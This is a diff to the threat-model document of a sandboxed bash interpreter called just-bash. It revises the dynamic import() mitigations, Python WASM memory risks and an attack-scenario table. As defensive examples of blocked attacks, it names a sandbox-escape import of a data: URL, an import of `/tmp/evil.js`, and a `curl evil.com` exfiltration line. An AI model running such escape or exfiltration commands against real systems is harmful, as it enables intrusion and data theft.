@@ -158,7 +158,7 @@ The following components are **trusted** and outside the scope of just-bash's ru
 | Proxy constructor | Create intercepting proxies | Blocked by defense-in-depth proxy | `src/security/blocked-globals.ts` |
 | WeakRef/FinalizationRegistry | GC observation/side channels | Blocked by defense-in-depth proxy | `src/security/blocked-globals.ts` |
 | process.chdir() | Confuse CWD tracking | Blocked by defense-in-depth proxy | `src/security/blocked-globals.ts` |
-| **dynamic import()** | `import('/tmp/evil.js')` | **BLOCKED**: `Module._resolveFilename` blocks file specifiers; ESM loader hooks block `data:`/`blob:` URLs (Node.js 20.6+; see §4.1) | `src/security/defense-in-depth-box.ts` |
+| **dynamic import()** | `import('/tmp/evil.js')` | Context-aware loader hooks block builtins and executable URL schemes where supported; other supported runtimes retain best-effort secondary controls (see §4.1) | `src/security/defense-in-depth-box.ts` |
 | child_process | spawn/exec/fork | Not imported anywhere; no code path from interpreter | Architecture |
 
 ### 3.6 Information Disclosure
@@ -223,23 +223,23 @@ The following components are **trusted** and outside the scope of just-bash's ru
 
 ## 4. Known Gaps & Residual Risks
 
-### 4.1 Dynamic import() Mitigated (Three Layers)
+### 4.1 Dynamic import() Defense Varies by Runtime Capability
 
-**Risk**: LOW (comprehensively mitigated on Node.js 20.6+)
+**Risk**: Defense-in-depth only; inspect the resolved runtime capability.
 
 Dynamic `import()` is a language-level keyword, not a property on any object. It cannot be intercepted by Proxy or defineProperty. However, it CAN be intercepted via Node.js ESM loader hooks.
 
 **Attack scenario**: If attacker achieves JS code execution → `import('data:text/javascript,...')` → full escape.
 
-**Mitigations** (three layers):
-1. **Module._resolveFilename blocked** — file-based `import()` specifiers (e.g., `import('/tmp/evil.js')`) are intercepted at the CJS module resolution level and blocked
-2. **ESM loader hooks** — `module.registerHooks()` (Node.js 23.5+) or `module.register()` (Node.js 20.6+) installs hooks that reject `data:` and `blob:` URL specifiers process-wide. No CLI flags required.
-3. **Filesystem restrictions** — OverlayFs writes to memory only, InMemoryFs has no real FS backing, so attacker cannot write .js files to the real filesystem
-4. **Architecture** — no code path exists from bash interpretation to JS execution; all paths (Function, eval, setTimeout, constructor chains) are blocked
+**Mitigations**:
+1. **Context-aware loader hooks** — when `node:module.registerHooks()` is available, builtin and executable URL imports are rejected only from the untrusted async context.
+2. **Scoped host controls** — supported runtimes without contextual hooks still apply the reversible best-effort global and CommonJS defenses.
+3. **Filesystem restrictions** — OverlayFs writes to memory only, and InMemoryFs has no real filesystem backing.
+4. **Architecture** — ordinary shell interpretation does not evaluate JavaScript. The opt-in `js-exec` feature uses a separately hardened worker boundary.
 
-**Residual risk**: On Node.js < 20.6 where `module.register()` is unavailable, `data:` URL imports remain unblockable. For those deployments, use `--experimental-loader` CLI hooks as an additional layer.
-
-**Note**: The ESM loader hooks are process-wide and permanent (cannot be unregistered). This is an accepted trade-off — `data:` and `blob:` URL imports are essentially never used in production Node.js applications.
+Call `DefenseInDepthBox.getInstance().getStatus()` and require `level: "full"`
+when contextual dynamic-import protection is a deployment requirement. The
+library does not install a permanent process-global deny-all loader.
 
 ### 4.2 Pre-Captured References Bypass Defense-in-Depth
 
@@ -295,7 +295,7 @@ When `python: true`, CPython 3.13 Emscripten provides full Python execution via 
 - Disabled by default; must be explicitly enabled via `{ python: true }`
 - 30-second timeout (`maxPythonTimeoutMs`; configurable)
 - Fresh Worker thread per execution (EXIT_RUNTIME; no state leakage between runs)
-- `WorkerDefenseInDepth` with only 2 exclusions: `shared_array_buffer`, `atomics`
+- `WorkerDefenseInDepth` with narrowly documented Emscripten compatibility exclusions; an earlier worker-entry guard blocks the exact dangerous CommonJS builtins before CPython loads
 - Stdlib shipped as `.pyc`-only zip in MEMFS (no real FS access, no runtime compilation)
 - 18+ file operations (open, stat, glob, pathlib, shutil, etc.) redirected through `/host` mount
 - C-level file operations (`_io.open`) also confined by Emscripten VFS (no NODEFS/NODERAWFS)
@@ -308,7 +308,7 @@ When `python: true`, CPython 3.13 Emscripten provides full Python execution via 
 - Python's `eval()` and `exec()` execute arbitrary Python (same as bash `eval`; no JS escalation path)
 - `/lib` (MEMFS stdlib) is writable within a single execution (each execution is fresh)
 - Symlink targets are readable via `os.readlink()` but not followable outside root
-- Python can allocate memory up to WASM limits (mitigated by 30s timeout)
+- CPython's WASM linear memory is not reliably contained by Node worker `resourceLimits`. Queue, deadline, bridge, and HOSTFS size controls bound other resources, but strong heap containment requires process/container isolation or a lower-memory CPython WASM build.
 
 ### 4.8 Error Message Information Leakage
 
@@ -358,7 +358,7 @@ Heredocs with variable expansion are size-limited (10MB) but nested heredocs wit
 | 3 | Access process.env | No bash→JS path. If bug: defense-in-depth → throw | **BLOCKED** (arch + secondary) |
 | 4 | Infinite loop | `while true; do :; done` → maxLoopIterations → throw | **BLOCKED** (limits) |
 | 5 | Prototype pollution | `arr[__proto__]=evil` → Map/null-prototype → no effect | **BLOCKED** (data guards) |
-| 6 | dynamic import() escape | Hypothetical JS exec → `import('data:...')` → ESM hooks block data:/blob: URLs | **BLOCKED** (Node.js 20.6+; residual on older) |
+| 6 | dynamic import() escape | Hypothetical JS exec → `import('data:...')` → contextual loader hook | **BLOCKED when status is `level: "full"`; inspect lower levels otherwise** |
 | 7 | Network exfiltration | `curl evil.com` → network off → curl not registered | **BLOCKED** (network isolation) |
 | 8 | process.exit() | No bash→JS path. If bug: defense-in-depth → throw | **BLOCKED** (arch + secondary) |
 | 9 | Brace expansion OOM | `{1..999999999}` → maxBraceExpansionResults → truncated | **BLOCKED** (limits) |
@@ -374,13 +374,13 @@ Heredocs with variable expansion are size-limited (10MB) but nested heredocs wit
 | 20 | performance.now() timing | Sub-ms timing attack → blocked by defense-in-depth | **BLOCKED** (secondary) |
 | 21 | Prototype pollution via `__defineGetter__` | Inject getter on prototype → blocked by defense-in-depth | **BLOCKED** (secondary) |
 | 22 | File-based import() | `import('/tmp/evil.js')` → Module._resolveFilename blocked → throw | **BLOCKED** (secondary) |
-| 23 | data: URL import() | `import('data:text/javascript,...')` → ESM loader hooks → throw | **BLOCKED** (Node.js 20.6+) |
+| 23 | data: URL import() | `import('data:text/javascript,...')` → contextual loader hook → throw | **BLOCKED when status is `level: "full"`; inspect lower levels otherwise** |
 
 ---
 
 ## 7. Recommendations for Future Hardening
 
-1. ~~**`--experimental-loader` for import() blocking**~~ — **IMPLEMENTED**: ESM loader hooks via `module.register()` (Node.js 20.6+) / `module.registerHooks()` (Node.js 23.5+) block `data:` and `blob:` URL imports process-wide. Combined with `Module._resolveFilename` blocking for file specifiers, `import()` is fully mitigated on Node.js 20.6+. No CLI flags required.
+1. **Runtime isolation for host-realm execution** — require `level: "full"` or use a dedicated worker/process when opt-in JavaScript can reach the host realm.
 2. ~~**Systematic error message audit**~~ — **IMPLEMENTED**: `sanitizeErrorMessage()` applied at all error choke points; strips OS paths, `node:internal/` paths, and stack traces
 3. **Content Security Policy for output** — Consider sanitizing output to prevent XSS when sandbox output is rendered in web contexts
 4. **Expand fuzzing corpus** — Add grammar rules for trap, job control (`&`, `fg`, `bg`), and deeply nested heredocs with expansion
